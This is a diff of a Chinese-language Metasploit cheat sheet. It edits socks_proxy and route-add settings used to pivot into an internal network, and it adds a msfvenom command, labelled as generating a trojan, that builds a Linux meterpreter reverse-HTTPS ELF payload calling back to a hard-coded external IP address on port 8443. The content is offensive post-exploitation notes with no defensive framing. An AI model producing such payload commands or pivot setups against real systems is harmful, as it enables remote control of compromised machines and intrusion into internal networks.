@@ -30,13 +30,13 @@ run
 
 # 开启sock4a
 use auxiliary/server/socks_proxy
-set version 4a
-set srvhost 114.215.27.76
-set srvport 1080
+set srvhost 0.0.0.0
+set srvport 2080
 run
 
 # 添加路由
 route add 47.168.52.0/8 <session id>
+
 ```
 
 ## meterpreter
@@ -54,8 +54,10 @@ shell
 
 
 
+### msfvenom
 
+```
+# 生成木马
+msfvenom -p linux/x64/meterpreter_reverse_https LHOST=114.215.27.76 LPORT=8443 -f elf > shell.elf
+```
 
-tips:
-
-1. sock是可以访问msf服务器的代理，autoroute是可以把代理导向内网
